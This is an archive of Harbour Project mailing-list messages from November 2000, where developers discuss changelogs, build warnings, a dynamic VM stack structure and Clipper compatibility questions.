>         * _GET_ => __GET translation is now fully Clipper compatible
>      (except the non-declared variables issue that Ron has pointed
>       lately although they can be edited correctly)
>
>     *source/pp/pptable.c
>         * Flex version doesn't pass a sixth argument to _GET_ function
>           (Clipper passes 5 arguments only)
>
>     *source/rtl/tgetint.prg
>         * replaced all internal '_1' variables with
>           PCOUNT()/HB_PVALUE(1)
>
> NOTE: All code have to be rebuild!


From harbour@lists.harbour-project.org  Thu Nov 30 11:30:10 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 30 11:30:10 2000
Subject: [Harbour] Changelog 2000-11-30 16:00 UTC+0100
Message-ID: <3A268E78.31408.44C4849@localhost>

 Ryszard Glab <rglab@imid.med.pl>

    *source/rtl/tgetint.prg
        * restored '_1' variable because
          {|| ..... __MVPUT( cVar, HB_PVALUE(1) )}
          will not access a correct value

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 30 13:06:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 30 13:06:01 2000
Subject: [Harbour] BUILD Warnings! (Ryszard, Brian, Bruno?, Alexander?, Horacio?)
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKKELLDHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGELNDHAA.ron@profit-master.com>

Ryszard,

For some time now we have the following warnings, I am not sure were they
come from? Strangely the same warning indeed appears multiple times.

Warning: public '_hb_compParse' in module 'macroy' clashes with prior module
'macroy'
Warning: public '_hb_compParse' in module 'macroy' clashes with prior module
'macroy'
Warning: public '_hb_compParse' in module 'macroy' clashes with prior module
'macroy'
Warning: public '_hb_compParse' in module 'macroy' clashes with prior module
'macroy'
Warning: public '_hb_compParse' in module 'macroy' clashes with prior module
'macroy'

Brian, (Alexander Bruno, Horacio - where are you?) can you look up these:

Warning W8012 source\rdd\dbfcdx\dbfcdx1.c 1135: Comparing signed and
unsigned values in function hb_cdxKeyCompare
Warning W8012 source\rdd\dbfcdx\dbfcdx1.c 1824: Comparing signed and
unsigned values in function hb_cdxTagTagLoad
Warning W8012 source\rdd\dbfcdx\dbfcdx1.c 2633: Comparing signed and
unsigned values in function hb_cdxIndexPageRead
Warning W8012 source\rdd\dbfcdx\dbfcdx1.c 2640: Comparing signed and
unsigned values in function hb_cdxIndexPageWrite
Warning W8012 source\rdd\dbfcdx\dbfcdx1.c 2813: Comparing signed and
unsigned values in function hb_cdxSortInsertWord
Warning W8008 source\rdd\dbfcdx\dbfcdx1.c 3238: Condition is always false in
function hb_cdxOrderCreate
Warning W8066 source\rdd\dbfcdx\dbfcdx1.c 3239: Unreachable code in function
hb_cdxOrderCreate
Warning W8008 source\rdd\dbfcdx\dbfcdx1.c 3240: Condition is always false in
function hb_cdxOrderCreate
Warning W8066 source\rdd\dbfcdx\dbfcdx1.c 3241: Unreachable code in function
hb_cdxOrderCreate
Warning W8066 source\rdd\dbfcdx\dbfcdx1.c 3834: Unreachable code in function
hb_cdxSeek

Ron


From harbour@lists.harbour-project.org  Thu Nov 30 13:07:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 30 13:07:01 2000
Subject: [Harbour] ChangeLog 2000-11-30 10:55 UTC+0100
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKKELLDHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKKELNDHAA.ron@profit-master.com>

2000-11-30 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * source/compiler/harbour.slx
     ! Commented out support for Self: as SELF, treat as any other
Identifier, until we finalize SELF support.


From harbour@lists.harbour-project.org  Thu Nov 30 13:56:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Thu Nov 30 13:56:02 2000
Subject: [Harbour] BUILD Warnings! (Ryszard, Brian, Bruno?, Alexander?, Horacio?)
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKGELNDHAA.ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKKELLDHAA.ron@profit-master.com>
Message-ID: <200011301855.eAUItPr10046@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Thu,
30 Nov 2000 10:07:38 -0800

> For some time now we have the following warnings, I am not sure were they
> come from? Strangely the same warning indeed appears multiple times.
> 
> Warning: public '_hb_compParse' in module 'macroy' clashes with prior module
> 'macroy'

You're compiling in C++ mode? Here's the solution that I posted back in
August for this problem:

> Have you tried enabling case-sensitive linking? I use "SET A_USR=/C"
> (to set case-sensitive linking, in addition to "SET C_USR=-P" and "SET
> L_USR=-P" to set C++ mode) and the only warnings that I get regarding
> hb_compParse() when I compile with Borland C++ 5.5 are about some
> unreachable code.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Thu Nov 30 14:01:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 30 14:01:02 2000
Subject: [Harbour] ChangeLog 2000-11-30 10:55 UTC+0100
Message-ID: <200011301359_MC2-BCAC-94BA@compuserve.com>

Ron/Ryszard,

"Clipper does *not* convert _GET_(...) to __GET(...) or __GETA(...) in
macros."

Weird, but True.

John.

From harbour@lists.harbour-project.org  Thu Nov 30 14:03:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Thu Nov 30 14:03:02 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <3A256D35.29940.538D766@localhost>
Message-ID: <000101c05aff$d69dccc0$0f2aa8c0@fivetechs>

Ryszard, JF, Ron

My plan is to change HB_STACK structure definition, and let
the compiler issue the errors and warnings, and start fixing:

/* stack managed by the virtual machine */
typedef struct
{
   PHB_ITEM * pItems;       /* pointer to the stack items */
   PHB_ITEM * pPos;         /* pointer to the latest used item */
   LONG     wItems;       /* total items that may be holded on the stack */
   HB_ITEM  Return;       /* latest returned value */
   PHB_ITEM * pBase;        /* stack frame position for the current function
call */
   PHB_ITEM * pEvalBase;    /* stack frame position for the evaluated
codeblock */
   int      iStatics;     /* statics base for the current function call */
   char     szDate[ 9 ];  /* last returned date from _pards() yyyymmdd
format */
} HB_STACK;

Do you agree with it ?

Antonio


From harbour@lists.harbour-project.org  Thu Nov 30 14:26:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 30 14:26:01 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <000101c05aff$d69dccc0$0f2aa8c0@fivetechs>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGELPDHAA.ron@profit-master.com>

Antonio,

Yes, by all means - go for it.

Ron

> Ryszard, JF, Ron
>
> My plan is to change HB_STACK structure definition, and let
> the compiler issue the errors and warnings, and start fixing:
>
> /* stack managed by the virtual machine */
> typedef struct
> {
>    PHB_ITEM * pItems;       /* pointer to the stack items */
>    PHB_ITEM * pPos;         /* pointer to the latest used item */
>    LONG     wItems;       /* total items that may be holded on
> the stack */
>    HB_ITEM  Return;       /* latest returned value */
>    PHB_ITEM * pBase;        /* stack frame position for the
> current function
> call */
>    PHB_ITEM * pEvalBase;    /* stack frame position for the evaluated
> codeblock */
>    int      iStatics;     /* statics base for the current function call */
>    char     szDate[ 9 ];  /* last returned date from _pards() yyyymmdd
> format */
> } HB_STACK;
>
> Do you agree with it ?
>
> Antonio


From harbour@lists.harbour-project.org  Thu Nov 30 14:29:01 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 30 14:29:01 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <000101c05aff$d69dccc0$0f2aa8c0@fivetechs>
References: <3A256D35.29940.538D766@localhost>
Message-ID: <3A26B973.4366.4F42CD7@localhost>

On 30 Nov 2000, at 20:00, Antonio Linares wrote:

> My plan is to change HB_STACK structure definition, and let
> the compiler issue the errors and warnings, and start fixing:

  I thought we will use more sophisticated method ;-)

>    PHB_ITEM * pItems;       /* pointer to the stack items */
>    PHB_ITEM * pPos;         /* pointer to the latest used item */
>    LONG     wItems;       /* total items that may be holded on the stack */
>    HB_ITEM  Return;       /* latest returned value */
>    PHB_ITEM * pBase;        /* stack frame position for the current function
> call */
>    PHB_ITEM * pEvalBase;    /* stack frame position for the evaluated
> codeblock */

  It seems OK although we are not using pEvalBase currently. However I 
think we can leave it here for later use.
  Do you mean _you_ will fix all issues are should we split fixing for 
more then one developer ?

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 30 14:30:04 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 30 14:30:04 2000
Subject: [Harbour] BUILD Warnings! (Ryszard, Brian, Bruno?, Alexander?, Horacio?)
In-Reply-To: <200011301855.eAUItPr10046@thor.parrett.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOELPDHAA.ron@profit-master.com>

David,

Strange! I don't believe so. My CFLAGS only uses -I, -L, and -lj flags.

I am using BCC55 w32, gtwin.

Ron

> > For some time now we have the following warnings, I am not sure 
> were they
> > come from? Strangely the same warning indeed appears multiple times.
> > 
> > Warning: public '_hb_compParse' in module 'macroy' clashes with 
> prior module
> > 'macroy'
> 
> You're compiling in C++ mode? Here's the solution that I posted back in
> August for this problem:
> 
> > Have you tried enabling case-sensitive linking? I use "SET A_USR=/C"
> > (to set case-sensitive linking, in addition to "SET C_USR=-P" and "SET
> > L_USR=-P" to set C++ mode) and the only warnings that I get regarding
> > hb_compParse() when I compile with Borland C++ 5.5 are about some
> > unreachable code.
> -- 
> David G. Holm, Set Captain and all around
> Harbour Project Clipper Compatibility fanatic.


From harbour@lists.harbour-project.org  Thu Nov 30 14:35:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 30 14:35:03 2000
Subject: [Harbour] Dynamic stack idea.
In-Reply-To: <3A25B5DD.15553.43014C@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEEMADHAA.ron@profit-master.com>

Phil,

I just realized, this will not address our problem, because at the EXTEND
routines level a pointer retrieved by means of the hb_par*() must be the
real pointer, so, it will still become invalid, if stack moved, between
retrieval and usage of the pointer.

Ron

> I was talking to another guy at work about the stack problems and
> he had an idea that might be usable.
>
> Let's say we allocate a 250K stack. We know it's offset in memory
> and we know it's size.
>
> When we put something on the stack, we get the location in the
> stack based on 0 being the first byte in the stack. If we run out of
> stack, allocate a larger block and copy the stack into it.
>
> The only thing that changed was the offset.
>
> Stack addressing would be (stackmasteroffset + stackoffset)
>
> When we increase the stack size, stackoffset variables remain the
> same and the offset is a static variable that is updated when the
> stack is copied.
>
> All stack references are created to the stackoffset from 0, not the
> real address in memory and the internal functions add the
> stackmasteroffset for the real memory address.
>
> Run out of stack? Allocate a bigger chunk, copy in the old stack,
> update the new master offset, release the old chunk.
>
> Need the real address? Add the stack pointer to the static
> stackmasteroffset variable in your C code. (or provide a wrapper
> function that does it)


From harbour@lists.harbour-project.org  Thu Nov 30 14:36:03 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Thu Nov 30 14:36:03 2000
Subject: [Harbour] BUILD Warnings! (Ryszard, Brian, Bruno?, Alexander?, Horacio?)
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKOELPDHAA.ron@profit-master.com>
References: <200011301855.eAUItPr10046@thor.parrett.net>
Message-ID: <200011301935.eAUJZgr13698@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Thu,
30 Nov 2000 11:31:36 -0800

> Strange! I don't believe so. My CFLAGS only uses -I, -L, and -lj flags.
> 
> I am using BCC55 w32, gtwin.

I'll update my repository and do a BCC 5.5 C build (*not* C++) and let
you know what my results are.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Thu Nov 30 14:41:03 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 30 14:41:03 2000
Subject: [Harbour] UnTrimmed aliases a bigger problem
In-Reply-To: <000b01c05983$bf9f7460$8604d2cc@san.rr.com>
Message-ID: <3A26BC54.24616.4FF6B00@localhost>

On 28 Nov 2000, at 13:39, Brian Hays wrote:

> This blows with an incorrect "Alias does not exist".
> Since this isn't isolated in a function call, I'm not sure how many places
> in the code would need to be prepared to trim the string, so perhaps
> DynSymFind (if that's the right func name) does need to replace a first
> space with a 0.....

  I think that we should create a function hb_rddTrimName() (or two 
separate hb_rddTrimAlias() and hb_rddTrimFieldName()) that will handle 
all issues connected with alias and field name handling. Clipper allows 
to use fields with trailing spaces too. Later this function can handle 
fields with spaces inside. We should call this function in the highest 
layer before passing it to virtual table functions. I think that places 
where such trimming is required can be located easily.

What do you think?

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 30 14:58:02 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 30 14:58:02 2000
Subject: [Harbour] ChangeLog 2000-11-30 10:55 UTC+0100
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKKELLDHAA.ron@profit-master.com>
References: <3A264A5E.7176.34244C3@localhost>
Message-ID: <3A26C05A.1248.50F2272@localhost>

On 30 Nov 2000, at 8:31, Ron Pinkas wrote:

> Clipper's bSetGet checks explicitly for NIL, as opposed to PCount(). This is
> why I changed it in TGetInt. Do you see any benefit in using PCount()?
> 
> In the name of strict compatibility I would prefer using _1, as Clipper
> does, especially since HB_PVALUE is not included unless HB_EXTENSION is
> defined. Which means __GET will stop working after your change, if
> HB_EXTENSION is not defined.

  I think that PCOUNT() is more usable. It will be possible to set a NIL 
value to an edited variable with evaluation of get:block. I don't see any 
real usage for it now but I don't see also any reason to limit this.

NIL cannot be used if there is no codeblock local variable declared like 
in macro compiled codeblock. Again I don't see any reason to limit the 
use of '_1' variable (even if it is not recommended usage) if we can 
safely set value with HB_PVALUE() function. If it is under HB_EXTENSION 
currently then we should make it a regular harbour function.

> Clipper does *not* convert _GET_(...) to __GET(...) or __GETA(...) in
> macros. Flex build does, which may introduce compatibility problems. I would
> recommend to protect it with #ifdef STRICT... if you still want to keep it.

  Then it is a great advantage of flex build if someone is using 
scripting (macro compilation) extensively. Although we can control this 
feature with some additional flag to ommit problems if someone is using 
_GET_ function. The macro subsystem is still missing set/get possibility 
to limit length of identifiers and disable/enable shortcutting of logical 
expressions evaluation (-z option of compiler). Macro compiler is aware 
of these flags but there is no way to set them. We will need some SETs 
related to macro or some HB_MACROSET() function(s).

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 30 15:05:04 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 30 15:05:04 2000
Subject: [Harbour] ChangeLog 2000-11-30 10:55 UTC+0100
In-Reply-To: <3A26C05A.1248.50F2272@localhost>
References: <LOBBKAFMMFGJIKLMEPAKKELLDHAA.ron@profit-master.com>
Message-ID: <3A26C202.29527.5159D8C@localhost>

On 30 Nov 2000, at 21:02, Ryszard Glab wrote:

>   Then it is a great advantage of flex build if someone is using 
> scripting (macro compilation) extensively. Although we can control this 
> feature with some additional flag to ommit problems if someone is using 
> _GET_ function. The macro subsystem is still missing set/get possibility 
> to limit length of identifiers and disable/enable shortcutting of logical 
> expressions evaluation (-z option of compiler). Macro compiler is aware 
> of these flags but there is no way to set them. We will need some SETs 
> related to macro or some HB_MACROSET() function(s).

  Sorry, I mean: contol it at runtime instead of #ifdef usage.

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 30 15:16:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Thu Nov 30 15:16:02 2000
Subject: [Harbour] BUILD Warnings! (Ryszard, Brian, Bruno?, Alexander?, Horacio?)
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKOELPDHAA.ron@profit-master.com>
References: <200011301855.eAUItPr10046@thor.parrett.net>
Message-ID: <200011302015.eAUKFir17500@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Thu,
30 Nov 2000 11:31:36 -0800

> Strange! I don't believe so. My CFLAGS only uses -I, -L, and -lj flags.
> 
> I am using BCC55 w32, gtwin.

I got the same results after updating and rebuilding (I've only been
building the rsxnt version recently). The cause of the problem is that
there are two functions in macro.y with names that only differ by case:
hb_compParse() and hb_compparse(). Which means that unless you create a
case-sensitive library, you get the warning. In config/w32/bcc32.cf,
locate the line "ARFLAGS = " and change it to "ARFLAGS = $(A_USR)". Then
you can set A_USR to /C to eliminate the problem when creating the
library, and then add -lc to C_USR, and set L_USR to -c in order for
linking to work.

Of course, it's also possible that this is pointing out some other
problem that needs to be solved by using a different name for one of the
two functions, but I don't know and things appear to work just fine with
the case sensitive library and linking...
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Thu Nov 30 15:30:03 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Thu Nov 30 15:30:03 2000
Subject: [Harbour] ChangeLog 2000-11-30 15:20 UTC-0500 David G. Holm <dholm@jsd-llc.com>
Message-ID: <200011302029.eAUKT7r18776@thor.parrett.net>

2000-11-30 15:20 UTC-0500 David G. Holm <dholm@jsd-llc.com>
   * config/dos/bcc16.cf
   * config/dos/djgpp.cf
   * config/dos/rsx32.cf
   * config/dos/watcom.cf
   * config/linux/gcc.cf
   * config/os2/gcc.cf
   * config/os2/icc.cf
   * config/w32/bcc32.cf
   * config/w32/gcc.cf
   * config/w32/icc.cf
   * config/w32/mingw32.cf
   * config/w32/msvc.cf
   * config/w32/rsxnt.cf
     + Added $(A_USR) to AR_FLAGS
   * tests/tstmacro.prg
     + Added MEMVAR declarations for all PRIVATE variables, so that it
       will compile without warnings when using the GNU Make System.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Thu Nov 30 15:35:03 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Thu Nov 30 15:35:03 2000
Subject: [Harbour] ChangeLog 2000-11-30 15:30 UTC-0500 David G. Holm <dholm@jsd-llc.com>
Message-ID: <200011302034.eAUKYQr19255@thor.parrett.net>

2000-11-30 15:30 UTC-0500 David G. Holm <dholm@jsd-llc.com>
   * include/hbver.h
     % Bumped revision code to j and set date to 2000-11-30 for
       a new set of interim builds that I'm going to release.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Thu Nov 30 19:54:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 30 19:54:02 2000
Subject: [Harbour] BUILD Warnings! (Ryszard, Brian, Bruno?, Alexander?, Horacio?)
In-Reply-To: <200011302015.eAUKFir17500@thor.parrett.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGEMCDHAA.ron@profit-master.com>

David, Ryszard,

I am puzzled!

1. When compiling macro.y we force a prefix hb_comp (-P hb_comp) which
effectively #define yyparse hb_compparse (Why?). This is normally requested
only if there are multiple parsers in the same exe, so that each "instance"
has unique set of function names.

2. In macro.y we have a hb_compParse() function which in turn calls the
generated parser, normally yyparse, but in this case hb_compParse() calls
hb_compparse().

How can this work, if the default C library is *not* case sensitive?

Please excuse this dumb question, but isn't C case sensitive by default? Can
I call a function using wrong case, and have it successfully link?

What am I missing?

EW, we should change the name of one of these hb_compParse().

Ron

> I got the same results after updating and rebuilding (I've only been
> building the rsxnt version recently). The cause of the problem is that
> there are two functions in macro.y with names that only differ by case:
> hb_compParse() and hb_compparse(). Which means that unless you create a
> case-sensitive library, you get the warning. In config/w32/bcc32.cf,
> locate the line "ARFLAGS = " and change it to "ARFLAGS = $(A_USR)". Then
> you can set A_USR to /C to eliminate the problem when creating the
> library, and then add -lc to C_USR, and set L_USR to -c in order for
> linking to work.
>
> Of course, it's also possible that this is pointing out some other
> problem that needs to be solved by using a different name for one of the
> two functions, but I don't know and things appear to work just fine with
> the case sensitive library and linking...
> --
> David G. Holm, Set Captain and all around
> Harbour Project Clipper Compatibility fanatic.


From harbour@lists.harbour-project.org  Thu Nov 30 20:07:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 30 20:07:02 2000
Subject: [Harbour] ChangeLog 2000-11-30 10:55 UTC+0100
In-Reply-To: <3A26C05A.1248.50F2272@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEMDDHAA.ron@profit-master.com>

Ryszard,

> > Clipper's bSetGet checks explicitly for NIL, as opposed to
> PCount(). This is
> > why I changed it in TGetInt. Do you see any benefit in using PCount()?
> >
> > In the name of strict compatibility I would prefer using _1, as Clipper
> > does, especially since HB_PVALUE is not included unless HB_EXTENSION is
> > defined. Which means __GET will stop working after your change, if
> > HB_EXTENSION is not defined.
>
>   I think that PCOUNT() is more usable. It will be possible to set a NIL
> value to an edited variable with evaluation of get:block. I don't see any
> real usage for it now but I don't see also any reason to limit this.

But this will break compatibility! In Clipper passing NIL to bSetGet will
*not* change the value of the GET, after your change, such code will set the
GET to NIL, effectively rendering it non-active.

If you insist on keeping it this way, I'll introduce a #ifdef SIMPLEX and
correct it in SimpLex build only.

> NIL cannot be used if there is no codeblock local variable declared like
> in macro compiled codeblock. Again I don't see any reason to limit the
> use of '_1' variable (even if it is not recommended usage) if we can
> safely set value with HB_PVALUE() function. If it is under HB_EXTENSION
> currently then we should make it a regular harbour function.

Same thing then, we should use _1 which is exactly how Clipper does it!

> > Clipper does *not* convert _GET_(...) to __GET(...) or __GETA(...) in
> > macros. Flex build does, which may introduce compatibility
> problems. I would
> > recommend to protect it with #ifdef STRICT... if you still want
> to keep it.
>
>   Then it is a great advantage of flex build if someone is using
> scripting (macro compilation) extensively. Although we can control this
> feature with some additional flag to ommit problems if someone is using
> _GET_ function. The macro subsystem is still missing set/get possibility
> to limit length of identifiers and disable/enable shortcutting of logical
> expressions evaluation (-z option of compiler). Macro compiler is aware
> of these flags but there is no way to set them. We will need some SETs
> related to macro or some HB_MACROSET() function(s).

Fine, I just suggested it should be *disabled* by *default*, so it won't
break compatibility, because currently it does!

Ron


From harbour@lists.harbour-project.org  Thu Nov 30 20:24:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Thu Nov 30 20:24:02 2000
Subject: [Harbour] adir compatibility
References: <006d01c05a4d$c7ae3b80$59f6fbce@local> <20001130084019.G6233@hagbard.davep.org>
Message-ID: <001b01c05b35$33c5a8c0$8604d2cc@san.rr.com>

Dave:
> > Perhaps the HARBOUR_STRICT_CLIPPER_COMPATIBILITY flag should control
this?
> > If set, Directory() should force to upper before returning?
>
> I thought that HARBOUR_STRICT_CLIPPER_COMPATIBILITY was something that
> "happened" at the time of building harbour itself? That doesn't sound very
> useful.

I would agree that it is the least flexible solution, but it's probably true
that if someone wants to build Harbour with
HARBOUR_STRICT_CLIPPER_COMPATIBILITY these functions should return uppercase
by default,
agreed ??
Would it make sense for anyone creating a Linux app to want
HARBOUR_STRICT_CLIPPER_COMPATIBILITY ?

I personally like harbour extensions via extra parameters, which give
programmer options to call as desired or write wrappers or header files that
default to personal standards.  I seem to remember some messages that
discouraged this approach.
But I would recommend an extra parameter to Directory and adir to control
filename case. If passed, this would be the final answer.  If not, the SET
setting proposed earlier would decide.

If HARBOUR_STRICT_CLIPPER_COMPATIBILITY is set, this setting should default
to UPPER.
Otherwise, perhaps the default should vary with the OS?  For Windows, I
would still recommend defaulting the setting to upper, but it would make
sense to have Unix flavors default to "raw".

Brian


From harbour@lists.harbour-project.org  Thu Nov 30 20:47:02 2000
From: harbour@lists.harbour-project.org (April)
Date: Thu Nov 30 20:47:02 2000
Subject: [Harbour] hello, April to earth...
References: <200011291632.eATGWqr26067@thor.parrett.net> <200011300240.eAU2e1r12329@thor.parrett.net>
Message-ID: <3A27034F.A5D46C1C@user.rose.com>

"David G. Holm" wrote:

> You'll find the answers to both of those questions at
> http://www.mathematik.uni-bielefeld.de/~rainer/

I know I am trying your patience, but when the subj pages states:

RSXNT:
The emx port of the GNU C/C++ compiler...

RSXNTDJ:
rsxntdj 1.6 uses the pe tools from rsxnt,

Well, I know I have seen the 'pe' term relating to djgpp before, and
there
is a few emx* files in my rsxntdj tree, but...

what is the difference?  is emx comparable (but not compatibile) to
djgpp?

thanks...
April




From harbour@lists.harbour-project.org  Thu Nov 30 21:29:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 30 21:29:02 2000
Subject: [Harbour] 2000-11-30 18:25 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <001b01c05b35$33c5a8c0$8604d2cc@san.rr.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEMEDHAA.ron@profit-master.com>

2000-11-30 18:25 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * include/hbmacro.h
   * source/macro/macro.y
   * source/vm/macro.c
     ! Renamed hb_compParse() to hb_macroYYParse(). We already have
hb_macroParse() and hcompparse()

   * source/compiler/harbour.y
     * Added token GET (not used) just so that harboury.h is compatible with
harbour.sly

   * source/rtl/tgetint.prg
     * Reverted to use _1 and == NIL to not break Clipper compatibility.

     /* Ryszard, if you want to re-introduce PCount() and HB_PVALUE(), I'll
ask (since I wrote this original code)
        that you protect it with #ifdef FLEX etc. If you do I would suggest
you further protect it with #ifdef STRICT...
	because this will definitely break strict compatibility. */


